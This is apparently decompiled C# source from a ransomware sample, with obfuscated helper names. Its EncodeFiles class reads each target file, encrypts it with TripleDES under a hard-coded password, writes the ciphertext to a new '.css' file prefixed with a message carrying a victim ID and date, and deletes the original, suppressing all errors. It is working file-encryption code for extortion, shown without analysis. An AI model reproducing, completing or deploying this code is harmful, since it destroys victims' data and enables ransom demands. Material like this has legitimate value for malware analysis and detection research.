using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace FL;

[StandardModule]
public sealed class EncodeFiles
{
	public static string Password;

	public static string MessageContains;

	static EncodeFiles()
	{
		Class8.t3hvLuccnmfIO();
		Class8.t3hvLuccnmfIO();
		MessageContains = Class1.smethod_2().Replace("%id%", generale.smethod_0()).Replace("%date%", Conversions.ToString(DateAndTime.get_Now()));
	}

	public static void WriteFile(string string_0, string string_1)
	{
		try
		{
			StreamWriter streamWriter = new StreamWriter(string_0);
			streamWriter.Write(string_1);
			streamWriter.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static string tdsEncode(string string_0, string string_1, bool bool_0 = false)
	{
		string text = null;
		TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		tripleDESCryptoServiceProvider.Key = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(string_1));
		tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
		ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateEncryptor();
		byte[] bytes = Encoding.ASCII.GetBytes(string_0);
		return Convert.ToBase64String(cryptoTransform.TransformFinalBlock(bytes, 0, bytes.Length));
	}

	public static void Encode_File(string string_0)
	{
		try
		{
			string string_ = Convert.ToBase64String(File.ReadAllBytes(string_0));
			string text = tdsEncode(string_, Password);
			WriteFile(string_0 + ".css", MessageContains + ";" + text);
			File.Delete(string_0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
